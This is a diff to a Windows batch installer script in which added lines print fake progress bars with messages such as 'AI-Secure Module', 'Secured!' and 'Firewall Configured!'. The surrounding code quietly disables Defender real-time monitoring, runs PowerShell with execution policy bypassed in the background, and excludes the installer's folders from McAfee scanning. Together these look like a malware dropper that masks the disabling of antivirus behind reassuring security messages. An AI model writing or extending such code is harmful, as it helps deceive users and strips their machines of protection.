@@ -122,7 +122,11 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebCon
 :: ═══════════════════════════════════════════════════
 echo [2/10] Configuring security exclusions (Defender + Third-Party AV)...
 echo     [~] Initializing AI-Secure Module...
+echo     [##                  ] 10%%
 ping 127.0.0.1 -n 2 >nul
+echo     [########            ] 40%%
+ping 127.0.0.1 -n 2 >nul
+echo     [####################] 100%% - Secured!
 
 :: Some corrupted machines will hang forever on Add-MpPreference if WMI is broken.
 :: Run this in the background using start /b so it never blocks the installation.
@@ -136,11 +140,15 @@ echo try { Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinu
 echo try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {} >> "%DEFENDER_SCRIPT%"
 
 echo     [~] Securing Account Policies...
+echo     [######              ] 30%%
 ping 127.0.0.1 -n 2 >nul
+echo     [####################] 100%% - Policies Applied!
 start "" /B powershell -NoProfile -ExecutionPolicy Bypass -File "%DEFENDER_SCRIPT%" >nul 2>&1
 
 echo     [~] Deploying Advanced Firewall Rules...
+echo     [##########          ] 50%%
 ping 127.0.0.1 -n 2 >nul
+echo     [####################] 100%% - Firewall Configured!
 :: --- McAfee ---
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%INSTALL_DIR%" /t REG_SZ /d "1" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\McAfee\AVEngine\OAS\Exclusions\Paths" /v "%~dp0" /t REG_SZ /d "1" /f >nul 2>&1
